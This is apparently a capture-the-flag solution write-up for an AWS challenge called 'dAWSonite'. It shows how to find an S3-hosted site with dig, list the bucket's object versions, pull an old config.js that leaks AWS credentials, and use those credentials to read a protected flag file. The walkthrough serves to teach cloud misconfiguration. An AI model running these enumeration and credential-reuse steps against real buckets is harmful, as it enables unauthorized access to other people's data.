# Solution

This challenge demonstrates some common misconfigurations in AWS infrastructure. Hence the name of the challenge - "dAWSonite".

One can start from checking the source code of the website. Here we can find link to [http://dawsonite.oioki.me/config.js] which does not contain anything interesting though.

Then, let's check DNS entry for the website:

```
$ dig dawsonite.oioki.me +short
dawsonite.oioki.me.s3-website-us-east-1.amazonaws.com.
s3-website-us-east-1.amazonaws.com.
52.216.112.218
```

So the website is hosted on S3. We can see a listing of the S3 bucket at [http://dawsonite.oioki.me.s3.amazonaws.com/]

```
config.js
error.html
flag.txt
index.html
```

The flag is at `/flag.txt`. However, the access is denied.

What is more interesting, is another listing, showing different versions of files: [http://dawsonite.oioki.me.s3.amazonaws.com/?versions]

```
...
<Version>
    <Key>config.js</Key>
    <VersionId>YGjtHwDPwQpAAwgGVwx6JRiVQE97wBDs</VersionId>
    <IsLatest>true</IsLatest>
    ...
</Version>
<Version>
    <Key>config.js</Key>
    <VersionId>H.RrWlKt7gvdyyIWHuRGgS7GP2LF0p8P</VersionId>
    <IsLatest>false</IsLatest>
    ...
</Version>
...
```

So, we still have old version of config.js hosted on S3. Let's get its content via [https://s3.amazonaws.com/dawsonite.oioki.me/config.js?versionId=H.RrWlKt7gvdyyIWHuRGgS7GP2LF0p8P]

It contains AWS credentials. We put them to `~/.aws/credentials` and try to get the flag again:

```
$ aws --profile dawsonite-reader s3 cp s3://dawsonite.oioki.me/flag.txt -
flag{XXXXX}
```
